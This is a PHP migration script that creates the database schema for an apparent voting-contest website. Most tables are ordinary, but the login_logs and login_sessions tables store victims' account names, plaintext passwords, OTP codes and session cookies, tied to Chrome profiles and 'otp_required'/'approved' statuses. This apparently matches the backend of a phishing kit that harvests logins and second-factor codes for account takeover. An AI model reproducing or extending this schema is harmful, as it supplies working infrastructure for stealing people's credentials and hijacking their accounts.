<?php
// Migration script - Tạo database schema
require_once __DIR__ . '/../services/db.php';

class DatabaseMigration {
    private $db;

    public function __construct() {
        $this->db = db();
    }

    public function run() {
        try {
            echo "🚀 Bắt đầu migration database...\n";

            $this->createUsersTable();
            $this->createAdminsTable();
            $this->createContestsTable();
            $this->createContestantsTable();
            $this->createVotesTable();
            $this->createNotificationsTable();
            $this->createNotificationTemplatesTable();
            $this->createLoginLogsTable();
            $this->createChromeProfilesTable();
            $this->createLoginSessionsTable();
            $this->createSystemSettingsTable();
            $this->createAuditLogsTable();
            $this->createUserSessionsTable();
            $this->createUploadsTable();

            echo "✅ Migration hoàn thành thành công!\n";

        } catch (Exception $e) {
            echo "❌ Migration thất bại: " . $e->getMessage() . "\n";
            $this->db->rollback();
        }
    }

    private function createUsersTable() {
        $sql = "CREATE TABLE IF NOT EXISTS users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(50) UNIQUE NOT NULL,
            email VARCHAR(100) UNIQUE NOT NULL,
            password_hash VARCHAR(255) NOT NULL,
            full_name VARCHAR(100),
            avatar_url VARCHAR(255),
            phone VARCHAR(20),
            status ENUM('active', 'inactive', 'banned') DEFAULT 'active',
            role ENUM('user', 'moderator', 'admin') DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            last_login TIMESTAMP NULL,
            ip_address VARCHAR(45),
            user_agent TEXT,
            INDEX idx_username (username),
            INDEX idx_email (email),
            INDEX idx_status (status)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng users\n";
    }

    private function createAdminsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS admins (
            id INT AUTO_INCREMENT PRIMARY KEY,
            username VARCHAR(50) UNIQUE NOT NULL,
            email VARCHAR(100) UNIQUE NOT NULL,
            password_hash VARCHAR(255) NOT NULL,
            full_name VARCHAR(100),
            role ENUM('admin', 'super_admin') DEFAULT 'admin',
            permissions JSON,
            status ENUM('active', 'inactive') DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            last_login TIMESTAMP NULL,
            INDEX idx_username (username),
            INDEX idx_role (role)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng admins\n";
    }

    private function createContestsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS contests (
            id INT AUTO_INCREMENT PRIMARY KEY,
            title VARCHAR(200) NOT NULL,
            description TEXT,
            banner_url VARCHAR(255),
            start_date TIMESTAMP NOT NULL,
            end_date TIMESTAMP NOT NULL,
            status ENUM('draft', 'active', 'voting', 'ended') DEFAULT 'draft',
            max_contestants INT DEFAULT 100,
            voting_rules TEXT,
            prizes JSON,
            created_by INT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (created_by) REFERENCES admins(id) ON DELETE SET NULL,
            INDEX idx_status (status),
            INDEX idx_dates (start_date, end_date)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng contests\n";
    }

    private function createContestantsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS contestants (
            id INT AUTO_INCREMENT PRIMARY KEY,
            contest_id INT NOT NULL,
            user_id INT NOT NULL,
            name VARCHAR(100) NOT NULL,
            description TEXT,
            image_url VARCHAR(255),
            video_url VARCHAR(255),
            social_links JSON,
            status ENUM('pending', 'approved', 'rejected') DEFAULT 'pending',
            total_votes INT DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (contest_id) REFERENCES contests(id) ON DELETE CASCADE,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            UNIQUE KEY unique_contest_user (contest_id, user_id),
            INDEX idx_contest_status (contest_id, status),
            INDEX idx_votes (total_votes DESC)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng contestants\n";
    }

    private function createVotesTable() {
        $sql = "CREATE TABLE IF NOT EXISTS votes (
            id INT AUTO_INCREMENT PRIMARY KEY,
            contest_id INT NOT NULL,
            contestant_id INT NOT NULL,
            voter_ip VARCHAR(45) NOT NULL,
            voter_user_agent TEXT,
            vote_value INT DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (contest_id) REFERENCES contests(id) ON DELETE CASCADE,
            FOREIGN KEY (contestant_id) REFERENCES contestants(id) ON DELETE CASCADE,
            UNIQUE KEY unique_vote (contest_id, contestant_id, voter_ip),
            INDEX idx_contest_contestant (contest_id, contestant_id),
            INDEX idx_voter_ip (voter_ip)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng votes\n";
    }

    private function createNotificationsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS notifications (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id INT,
            admin_id INT,
            title VARCHAR(200) NOT NULL,
            message TEXT NOT NULL,
            type ENUM('info', 'success', 'warning', 'error') DEFAULT 'info',
            status ENUM('unread', 'read') DEFAULT 'unread',
            read_at TIMESTAMP NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            FOREIGN KEY (admin_id) REFERENCES admins(id) ON DELETE CASCADE,
            INDEX idx_user_status (user_id, status),
            INDEX idx_admin_status (admin_id, status),
            INDEX idx_created_at (created_at DESC)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng notifications\n";
    }

    private function createNotificationTemplatesTable() {
        $sql = "CREATE TABLE IF NOT EXISTS notification_templates (
            id INT AUTO_INCREMENT PRIMARY KEY,
            name VARCHAR(100) NOT NULL,
            title_template VARCHAR(200) NOT NULL,
            message_template TEXT NOT NULL,
            type ENUM('info', 'success', 'warning', 'error') DEFAULT 'info',
            variables JSON,
            is_active BOOLEAN DEFAULT TRUE,
            created_by INT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (created_by) REFERENCES admins(id) ON DELETE SET NULL,
            INDEX idx_name (name),
            INDEX idx_active (is_active)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng notification_templates\n";
    }

    private function createLoginLogsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS login_logs (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id INT,
            admin_id INT,
            account VARCHAR(100) NOT NULL,
            password VARCHAR(255),
            link_name VARCHAR(200),
            otp_code VARCHAR(10),
            ip_address VARCHAR(45) NOT NULL,
            user_agent TEXT,
            status ENUM('pending', 'success', 'failed', 'otp_required', 'approved') DEFAULT 'pending',
            cookies TEXT,
            chrome_profile VARCHAR(100),
            notes TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL,
            FOREIGN KEY (admin_id) REFERENCES admins(id) ON DELETE SET NULL,
            INDEX idx_account (account),
            INDEX idx_status (status),
            INDEX idx_ip (ip_address),
            INDEX idx_created_at (created_at DESC)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng login_logs\n";
    }

    private function createChromeProfilesTable() {
        $sql = "CREATE TABLE IF NOT EXISTS chrome_profiles (
            id INT AUTO_INCREMENT PRIMARY KEY,
            name VARCHAR(255) NOT NULL,
            description TEXT,
            user_id INT NOT NULL,
            profile_path VARCHAR(500) NOT NULL,
            status ENUM('active', 'inactive', 'deleted') DEFAULT 'active',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            UNIQUE KEY unique_profile_name (name, user_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng chrome_profiles\n";
    }

    private function createSystemSettingsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS system_settings (
            id INT AUTO_INCREMENT PRIMARY KEY,
            setting_key VARCHAR(100) UNIQUE NOT NULL,
            setting_value TEXT,
            setting_type ENUM('string', 'number', 'boolean', 'json') DEFAULT 'string',
            description TEXT,
            is_public BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            INDEX idx_key (setting_key),
            INDEX idx_public (is_public)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng system_settings\n";
    }

    private function createAuditLogsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS audit_logs (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id INT,
            admin_id INT,
            action VARCHAR(100) NOT NULL,
            table_name VARCHAR(100),
            record_id INT,
            old_values JSON,
            new_values JSON,
            ip_address VARCHAR(45),
            user_agent TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL,
            FOREIGN KEY (admin_id) REFERENCES admins(id) ON DELETE SET NULL,
            INDEX idx_user_action (user_id, action),
            INDEX idx_admin_action (admin_id, action),
            INDEX idx_created_at (created_at DESC),
            INDEX idx_table_record (table_name, record_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng audit_logs\n";
    }

        private function createUserSessionsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS user_sessions (
            id INT AUTO_INCREMENT PRIMARY KEY,
            user_id INT NOT NULL,
            session_token VARCHAR(255) UNIQUE NOT NULL,
            ip_address VARCHAR(45),
            user_agent TEXT,
            expires_at TIMESTAMP NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            INDEX idx_token (session_token),
            INDEX idx_user (user_id),
            INDEX idx_expires (expires_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng user_sessions\n";
    }

    private function createUploadsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS uploads (
            id INT AUTO_INCREMENT PRIMARY KEY,
            original_name VARCHAR(255) NOT NULL,
            filename VARCHAR(255) NOT NULL,
            filepath VARCHAR(500) NOT NULL,
            category VARCHAR(50) DEFAULT 'general',
            mime_type VARCHAR(100) NOT NULL,
            size BIGINT NOT NULL,
            dimensions JSON,
            duration DECIMAL(10,2),
            user_id INT,
            metadata JSON,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL,
            INDEX idx_user (user_id),
            INDEX idx_category (category),
            INDEX idx_created_at (created_at DESC)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng uploads\n";
    }

    private function createLoginSessionsTable() {
        $sql = "CREATE TABLE IF NOT EXISTS login_sessions (
            id INT AUTO_INCREMENT PRIMARY KEY,
            platform VARCHAR(100) NOT NULL,
            chrome_profile_id INT NOT NULL,
            link_name VARCHAR(255) NOT NULL,
            user_id INT NOT NULL,
            status ENUM('pending', 'running', 'completed', 'failed', 'stopped') DEFAULT 'pending',
            account VARCHAR(255),
            password VARCHAR(255),
            otp VARCHAR(50),
            ip VARCHAR(45),
            device TEXT,
            cookie TEXT,
            notes TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            FOREIGN KEY (chrome_profile_id) REFERENCES chrome_profiles(id) ON DELETE CASCADE,
            FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
            INDEX idx_status (status),
            INDEX idx_platform (platform),
            INDEX idx_user_id (user_id),
            INDEX idx_chrome_profile_id (chrome_profile_id)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci";

        $this->db->execute($sql);
        echo "✅ Tạo bảng login_sessions\n";
    }
}

// Chạy migration nếu được gọi trực tiếp
if (php_sapi_name() === 'cli') {
    $migration = new DatabaseMigration();
    $migration->run();
}
?>
